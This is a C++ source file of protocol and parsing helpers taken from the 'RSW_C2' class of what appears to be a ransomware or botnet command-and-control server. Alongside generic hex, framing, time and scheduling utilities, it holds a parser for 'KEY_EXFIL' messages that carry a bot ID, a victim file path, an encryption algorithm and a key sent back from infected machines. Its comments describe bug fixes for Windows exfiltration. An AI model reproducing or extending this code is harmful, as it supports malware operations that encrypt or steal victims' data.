/*
 * rsw_protocol.cpp — Stateless protocol/parse implementations.
 *
 * All bodies moved verbatim from RSW.cpp's RSW_C2 class (now free functions
 * in namespace rsw) — behavior must be byte-identical. Verified by
 * tests/test_rsw_protocol.cpp and the end-to-end smoke test.
 */
#include "rsw_protocol.h"

#include <sstream>
#include <stdexcept>
#include <vector>

using namespace std;

namespace rsw {

string trim(const string& text) {
    size_t start = text.find_first_not_of(" \t\n\r");
    if (start == string::npos) return "";
    size_t end = text.find_last_not_of(" \t\n\r");
    return text.substr(start, end - start + 1);
}

string formatTime(time_t timestamp) {
    time_t now = time(nullptr);
    int diff = (int)(now - timestamp);

    if (diff < 60) return to_string(diff) + "s ago";
    if (diff < 3600) return to_string(diff/60) + "m ago";
    if (diff < 86400) return to_string(diff/3600) + "h ago";
    return to_string(diff/86400) + "d ago";
}

string bytesToHex(const string& data) {
    string hex_string;
    hex_string.reserve(data.length() * 2);

    for (unsigned char c : data) {
        hex_string += "0123456789ABCDEF"[c >> 4];
        hex_string += "0123456789ABCDEF"[c & 0x0F];
    }
    return hex_string;
}

string hexToBytes(const string& hex) {
    string bytes;
    bytes.reserve(hex.length() / 2);

    for (size_t i = 0; i < hex.length(); i += 2) {
        string byte_string = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byte_string.c_str(), nullptr, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// Wrap/unwrap transport protocol (matches client)
string wrapForTransport(const string& data) {
    string wrapped;
    size_t length = data.length();

    wrapped += (char)((length >> 24) & 0xFF);
    wrapped += (char)((length >> 16) & 0xFF);
    wrapped += (char)((length >> 8) & 0xFF);
    wrapped += (char)(length & 0xFF);

    unsigned char checksum = 0;
    for (char c : data) {
        checksum ^= (unsigned char)c;
    }
    wrapped += (char)checksum;
    wrapped += data;

    return wrapped;
}

string unwrapFromTransport(const string& data) {
    if (data.length() < 5) return data;

    size_t length = ((unsigned char)data[0] << 24) |
                   ((unsigned char)data[1] << 16) |
                   ((unsigned char)data[2] << 8) |
                   (unsigned char)data[3];

    // 256MB cap — must exceed any legitimate frame (32KB chunk uploads
    // hex-encode to >64KB, which the old 65536 cap truncated).
    if (length > 0x0FFFFFFF || length > data.length() - 5) {
        return data;
    }

    string extracted = data.substr(5, length);
    unsigned char checksum = (unsigned char)data[4];

    unsigned char calc_checksum = 0;
    for (char c : extracted) {
        calc_checksum ^= (unsigned char)c;
    }

    if (calc_checksum == checksum) {
        return extracted;
    }

    return data;
}

time_t parseScheduleTime(const string& schedule_str) {
    time_t now = time(nullptr);
    struct tm* tm_now = localtime(&now);

    if (schedule_str.find("*/") == 0) {
        // Interval format: */N (every N minutes)
        try {
            int interval = stoi(schedule_str.substr(2));
            if (interval <= 0) {
                // */0 or negative → next_run lands at/before 'now' on every
                // tick → scheduler would re-trigger the task forever.
                // Reject at creation instead.
                return 0;
            }
            return now + (interval * 60);
        } catch (const exception&) {
            return 0; // Invalid interval number
        }
    }
    else if (schedule_str.find(":") != string::npos) {
        // Daily format: HH:MM
        size_t colon_pos = schedule_str.find(":");
        try {
            int hour = stoi(schedule_str.substr(0, colon_pos));
            int minute = stoi(schedule_str.substr(colon_pos + 1));

            struct tm target_tm = *tm_now;
            target_tm.tm_hour = hour;
            target_tm.tm_min = minute;
            target_tm.tm_sec = 0;

            time_t target_time = mktime(&target_tm);

            // If the target time already passed today, schedule for tomorrow
            if (target_time <= now) {
                target_time += 86400;
            }

            return target_time;
        } catch (const exception&) {
            return 0; // Invalid time components
        }
    }

    return 0; // Unknown format
}

KeyExfil parseKeyExfil(const string& message) {
    KeyExfil result;
    // Accept both "KEY_EXFIL:..." full message and bare payload
    string payload = message;
    if (payload.substr(0, 10) == "KEY_EXFIL:") {
        payload = payload.substr(10);
    }

    // '|' separators: file_path may contain ':' on Windows (C:\...) —
    // the old ':' split shifted algo/key extraction into the path bytes
    // on every Windows exfil.
    size_t sep1 = payload.find('|');
    size_t sep2 = payload.find('|', sep1 + 1);
    size_t sep3 = payload.find('|', sep2 + 1);

    if (sep1 == string::npos || sep2 == string::npos || sep3 == string::npos) {
        return result; // invalid = false
    }

    result.valid = true;
    result.bot_id    = payload.substr(0, sep1);
    result.file_path = payload.substr(sep1 + 1, sep2 - sep1 - 1);
    result.algo      = payload.substr(sep2 + 1, sep3 - sep2 - 1);
    result.key       = payload.substr(sep3 + 1);
    return result;
}

string centerText(const string& text, int width) {
    int padding = (width - (int)text.length()) / 2;
    if (padding < 0) padding = 0;
    return string(padding, ' ') + text + string(width - padding - (int)text.length(), ' ');
}

} // namespace rsw
